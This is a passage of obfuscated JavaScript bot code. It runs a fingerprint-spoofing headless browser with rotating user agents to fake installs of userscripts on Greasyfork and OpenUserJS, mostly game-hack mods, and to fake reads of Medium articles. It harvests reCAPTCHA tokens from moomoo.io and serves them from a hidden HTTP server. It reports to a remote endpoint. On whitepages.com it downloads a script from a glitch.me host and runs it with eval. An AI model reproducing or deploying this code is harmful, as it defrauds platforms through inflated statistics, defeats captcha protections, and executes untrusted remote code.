      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + T(0x5) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + V(0x19, 'IGT0') + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + V(0x17, 'xmOc') + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + V(0x3, 'A4z6') + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + V(0x10, '^yX6') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + T(0x1c) + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + V(0x14, 'jdp%') + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1426 + -0xc5 * -0x1 + -0x77 * 0x2d
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const X = b,
      W = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()[W(0x1b) + 'rActionLay' + 'er'](0x1 * -0x1e77 + 0x418 + -0x1a5f * -0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j[X(0x2, 'wrKC')]();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1fe7 + -0xd36 + 0x2d81), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x4e6 + 0x3d * 0x6a + 0x7f * -0x3c), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1 * -0x13ed + 0x380 + 0x7cf * -0x3;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x8e1 * 0x1 + 0x11 * 0x14 + 0x78d; w < getRandomInt(0xec4 + -0x1 * 0x1f6e + -0xfb * -0x11, -0x1d82 + -0x1 * -0x47b + -0xe5 * -0x1c); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x7d95 + 0x1 * -0x19602 + 0x202cd);
        }
      }();
    }, -0xedf + -0x202b + 0x2f6e), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x26cd + 0x1d19 + -0x43e6;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x3e0 + -0x147d * 0x1 + 0x185d, 0x349 * -0xb + -0x26b1 + 0x4b06)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x1 * -0x6a43 + -0x22fc + 0x2de9);
    }, 0x92c + 0x21f * -0x8 + 0x830), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const Y = b;
        try {
          let s = 0x5a8 + 0x13 * -0x14b + 0x12e9;
          const t = await m[Y(0x8, '8Q&s') + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1794 + -0x6 * 0xd1 + 0x2832), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xb9b + 0x19e4 + -0xe49), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x80a95 + 0x17ab0 + -0x6c3d7 * -0x3);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0xf * 0x27d + 0x2ab * 0xb + 0x85e);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x251d + -0x2 * -0x8dd + 0x142b);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x65c + -0x22e2 + 0x48ce * 0x1);
}
doFlags['doOUJS'] && ((async () => {
  const bf = {
      f: 0x6
    },
    a0 = b,
    Z = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xe93 + 0x8ec * 0x1 + 0xb5 * 0x8) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * 0x2159 + -0x2 * 0x11e4 + 0x4522));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x9af + -0xe57 * -0x2 + -0x1 * 0x12ff, D['indexOf']('\x20'));
        return B ? E['slice'](0x1a0a + -0x2 * 0xa17 + -0x5dc, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x4467 + 0x1 * 0x204d + 0x20e * -0x1e),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x42a6 + -0x8bc * -0x4 + 0x46c6),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + Z(bf.f) + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a0(0x11, 'jdp%') + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x270e + -0xff + -0x260f * 0x1; k < -0x1 * -0x89 + 0x1f6 + -0x7f * 0x5; k++)
    setTimeout(f, (0x1cdbf + -0xd5b + -0xd604) * k * getRandomInt(0x1943 + 0x1d41 + -0x3683 * 0x1, -0xd * -0xdd + 0x1ba1 + -0x26d7));
  setInterval(() => {
    f();
    for (let l = 0x1291 + -0x1 * -0x46a + -0x16fb; l < 0x1 * 0x513 + 0x1 * 0x2038 + -0x2547; l++)
      setTimeout(f, (0x10aa2 + -0x8564 + 0x6522) * l * getRandomInt(0x8bd + -0x2110 + -0x6 * -0x40e, 0x295 * 0x3 + -0xd2c + 0x18 * 0x3a));
  }, 0x1bbf51 + 0x7 * 0x843fd + -0x1eacbc);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
